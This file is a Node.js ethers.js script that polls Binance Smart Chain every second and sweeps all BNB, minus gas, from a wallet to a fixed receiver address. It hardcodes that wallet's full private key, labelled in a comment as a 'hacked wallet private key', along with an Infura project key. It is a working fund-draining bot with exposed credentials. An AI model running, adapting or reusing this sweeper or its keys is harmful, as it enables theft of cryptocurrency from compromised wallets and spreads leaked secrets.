const ethers = require('ethers');
const { BigNumber } = ethers;
const provider = new ethers.providers.JsonRpcProvider("https://bsc-mainnet.infura.io/v3/79e4e8fbf4fa45e5a1eaa78b33707aa1");

// Set faster polling interval
provider.pollingInterval = 1000; // 1 second polling for new blocks

const privateKey = 'a455b9e81e5bd0a6c0568a251b93335f34bc5b49b4e8e45ccd70f2879dba0223'; // hacked wallet private key

const signer = new ethers.Wallet(privateKey, provider);
console.log(`signer : ${signer.address}`);

const bot = async () => {
    const senderAddress = signer.address; // hacked wallet address
    const receiverAddress = ethers.utils.getAddress("0x185528ca0dd444dcb667ccedbd15b8f0581c5da9"); // receiver wallet address

    provider.on("block", async (blockNumber) => {
        console.log(`block : ${blockNumber}`);
        
        // Get the balance of native BNB (not ERC-20 tokens)
        const balance = await provider.getBalance(senderAddress);

        const gasLimit = 21000; // standard gas limit for BNB transfer
        const gasPrice = await provider.getGasPrice(); // current gas price
        
        const gasFee = gasLimit * gasPrice; // calculate total gas cost in Wei

        console.log(`Gas fee estimate: ${ethers.utils.formatEther(gasFee.toString())} BNB`);

        if (balance.gt(gasFee)) {  // Only send if balance can cover gas fees
            const amountToSend = balance.sub(gasFee); // Subtract gas fee from total balance

            try {
                console.log(`Balance: ${ethers.utils.formatEther(balance)} BNB`);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BNB`);

                // Send the transaction
                const tx = await signer.sendTransaction({
                    to: receiverAddress,
                    value: amountToSend,  // Send available BNB minus gas fees
                    gasPrice: gasPrice,
                    gasLimit: gasLimit,
                });

                console.log(`Transaction hash: ${tx.hash}`);

                // Wait for the transaction to be mined with 1 confirmation
                const receipt = await tx.wait(1);
                console.log(`Transaction success :) | tx hash: ${receipt.transactionHash}`);
                console.log(`Transaction was mined in block: ${receipt.blockNumber}`);

            } catch (error) {
                console.log("Error sending transaction:", error);
            }
        } else {
            console.log("Not enough BNB to cover gas fees.");
        }
    });
};

bot();
